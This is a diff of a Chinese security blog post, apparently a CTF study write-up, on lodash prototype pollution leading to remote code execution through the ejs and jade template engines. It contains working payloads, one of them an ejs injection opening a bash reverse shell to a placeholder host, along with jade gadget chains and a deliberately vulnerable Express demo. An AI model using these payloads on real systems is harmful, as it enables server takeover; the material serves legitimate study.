@@ -169,7 +169,6 @@
 <p>RCE 的前提是要有原型链污染</p>
 <p>lodash 原型链污染demo</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> malicious_payload = <span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;oops&quot;:&quot;It works !&quot;&#125;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Before : &quot;</span> + a.oops);</span><br><span class="line">_.merge(&#123;&#125;, <span class="built_in">JSON</span>.parse(malicious_payload));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;After : &quot;</span> + a.oops);</span><br></pre></td></tr></table></figure>
-
 <h2 id="0x01-ejs"><a href="#0x01-ejs" class="headerlink" title="0x01 ejs"></a>0x01 ejs</h2><p>环境和调试代码参考 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7075#toc-5">https://xz.aliyun.com/t/7075#toc-5</a></p>
 <p>逐步跟踪找到渲染模板的compile函数,参考<a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">Express+lodash+ejs: 从原型链污染到RCE</a></p>
 <p>从index.js::res.render开始跟进</p>
@@ -201,21 +200,17 @@
 <p>所以控制opts.outputFunctionName就可以注入任意代码.</p>
 <p>payload:</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
-
 <h2 id="0x02-jade"><a href="#0x02-jade" class="headerlink" title="0x02 jade"></a>0x02 jade</h2><h3 id="1-先贴两个利用链"><a href="#1-先贴两个利用链" class="headerlink" title="1.先贴两个利用链"></a>1.先贴两个利用链</h3><p>这个之前见到了两个利用链,但是做ctfshow题目的时候都不能利用.</p>
 <p>先贴出利用链:</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span></span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;self&quot;</span>:<span class="string">&quot;true&quot;</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;2,jade_debug[0].filename));return global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;)//&quot;</span>&#125;&#125;</span><br><span class="line"><span class="number">2.</span> </span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;)&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
-
 <h3 id="2-利用链分析"><a href="#2-利用链分析" class="headerlink" title="2. 利用链分析"></a>2. 利用链分析</h3><p>参考 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></p>
 <ul>
 <li>环境搭建</li>
 </ul>
 <p>app.js</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> lodash= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, path.join(__dirname));</span><br><span class="line">app.engine(<span class="string">&#x27;jade&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;jade&#x27;</span>).__express);</span><br><span class="line">app.set(<span class="string">&quot;view engine&quot;</span>, <span class="string">&quot;jade&quot;</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json()).use(express.urlencoded(&#123;</span><br><span class="line">    extended: <span class="literal">false</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> malicious_payload = <span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;self&quot;:&quot;true&quot;,&quot;line&quot;:&quot;1000000,jade_debug[0].filename));return global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(\&#x27;calc\&#x27;)//&quot;&#125;&#125;&#x27;</span>;</span><br><span class="line">lodash.merge(&#123;&#125;, <span class="built_in">JSON</span>.parse(malicious_payload));</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    res.render(<span class="string">&#x27;./index.jade&#x27;</span>, &#123;</span><br><span class="line">        title: <span class="string">&#x27;hello&#x27;</span>,</span><br><span class="line">        name: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app.use(<span class="string">&#x27;/&#x27;</span>, router)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;Example app listening on port http://127.0.0.1:3000 !&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
 <p>index.jade</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h1&#x3D; title</span><br><span class="line">p hello #&#123;name&#125;</span><br></pre></td></tr></table></figure>
-
 <p>直接利用上面的payload会报错</p>
 <p><img src="1613890867473.png" alt="1613890867473"></p>
 <p>先调试分析漏洞利用点</p>
@@ -252,17 +247,14 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h1 title: #&#123;title&#125;</span><br><span class="line">p hello #&#123;name&#125;</span><br></pre></td></tr></table></figure>
 
 
-
 <p><img src="1613892847603.png" alt="1613892847603"></p>
 <p>初步猜测污染self太粗暴,会影响<code>h1= title</code>这种模板渲染方式(不确定猜测是否正确.)</p>
 <h3 id="3-Ctfshow题目分析"><a href="#3-Ctfshow题目分析" class="headerlink" title="3. Ctfshow题目分析"></a>3. Ctfshow题目分析</h3><p>ctfshow有一道题目也是考察jade链的利用.</p>
 <p>只贴模板信息(其余的都差不多)</p>
 <p>layout.jade</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">doctype html</span><br><span class="line">html</span><br><span class="line">  head</span><br><span class="line">    title&#x3D; title</span><br><span class="line">  body</span><br><span class="line">    block content</span><br></pre></td></tr></table></figure>
-
 <p>index.jade</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">extends layout</span><br><span class="line"></span><br><span class="line">block content</span><br><span class="line">  h1&#x3D; title</span><br><span class="line">  p Welcome to #&#123;title&#125;</span><br></pre></td></tr></table></figure>
-
 <p>将上面分析得到的payload打入.报了如下错误.</p>
 <p><img src="1613973792970.png" alt="1613973792970"></p>
 <p>跟着调用栈分析.最终可以找到在visitNode函数.会有node.type为undefined的情况,</p>
@@ -271,33 +263,28 @@
 <p><img src="1613973894835.png" alt="1613973894835"></p>
 <p>解决方法就是把type也污染了.全部测试了一下,发现visitxxx函数及可用的如下</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">visitAttributes</span><br><span class="line">visitEach</span><br><span class="line">visitCode √</span><br><span class="line">visitBlockComment√</span><br><span class="line">visitComment√</span><br><span class="line">visitText</span><br><span class="line">visitFilter</span><br><span class="line">visitTag</span><br><span class="line">visitMixin</span><br><span class="line">visitDoctype√</span><br><span class="line">visitMixinBlock√</span><br><span class="line">visitBlock</span><br><span class="line">visitLiteral</span><br><span class="line">visitWhen</span><br><span class="line">visitCase</span><br><span class="line">visitNode</span><br></pre></td></tr></table></figure>
-
 <p>payload举例</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="attr">&quot;self&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
 <h3 id="4-填坑"><a href="#4-填坑" class="headerlink" title="4.填坑."></a>4.填坑.</h3><p>最开始的模板.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h1&#x3D; title</span><br><span class="line">p hello #&#123;name&#125;</span><br></pre></td></tr></table></figure>
-
 <p>执行payload会报如下错误.</p>
 <p><img src="1613977699618.png" alt="1613977699618"></p>
 <p>这个具体哪报错也没分析到,但是尝试污染title.</p>
 <p>payload:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;title&quot;:&quot;test&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;calc&#39;)&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
 <p>发现就成功了.</p>
 <p><img src="1613977799878.png" alt="1613977799878"></p>
 <h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结."></a>0x03 总结.</h2><p>原型链污染的精髓:undefined属性/值</p>
 <p>下面梳理一下上面有关jade RCE链的payload</p>
 <p>针对普通的模板:只需要污染self和line.</p>
 <ul>
-<li> 包括下面这种</li>
-</ul>
-  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h1 #&#123;title&#125;</span><br><span class="line">p Welcome to #&#123;title&#125;</span><br></pre></td></tr></table></figure>
-
+<li><p>包括下面这种</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h1 #&#123;title&#125;</span><br><span class="line">p Welcome to #&#123;title&#125;</span><br></pre></td></tr></table></figure>
 <p>有继承的模板: 需要污染type</p>
+</li>
+</ul>
 <p>顶格的<code>h= title</code>类型的: 污染block属性(title,name这些模板变量)</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h1&#x3D; title</span><br><span class="line">p hello #&#123;name&#125;</span><br></pre></td></tr></table></figure>
-
 <h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p>ejs:</p>
 <ul>
 <li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6113"> XNUCA2019 Hardjs题解 从原型链污染到RCE </a></p>
